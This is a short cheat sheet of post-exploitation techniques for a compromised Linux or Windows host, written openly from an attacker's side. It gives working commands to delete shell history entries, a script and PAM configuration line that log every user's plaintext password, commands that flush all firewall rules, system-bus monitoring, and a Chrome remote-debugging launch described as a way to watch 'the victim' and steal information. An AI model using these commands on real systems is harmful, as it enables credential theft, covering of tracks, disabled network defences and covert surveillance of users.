
1. remove a content of the history file
history -d -2 && history -d -1


2. I can configure a PAM module to log each password of each user.

First, we create a bash script (toomanysecrets.sh) that will be invoked whenever a new authentication occurs

#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log

Here is the meaning of the variables:
$PAM_USER: The username that was entered.
$PAM_RHOST: The remote host (typically the IP Address)
$(cat -): This reads stdin, and will contain the password that the script grabs
The results are piped into a log file 

Next, the PAM configuration file needs to be updated the pam_exec module will be used to invoke the script

sudo nano /etc/pam.d/common-auth

On the very bottom of the file, add the following authentication module:

auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
Finally, make the file executable:

sudo chmod 700 /usr/local/bin/toomanysecrets.sh

3.delete iptables rules
iptables --flush
iptables --delete-chain

4. monitor system bus communication

#to list available interfaces
busctl list

#choose the interesting interface and

sudo busctl monitor <interface>

5. launch a Chrome process  to inspect everything the victim does with Chrome and steal sensitive information
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
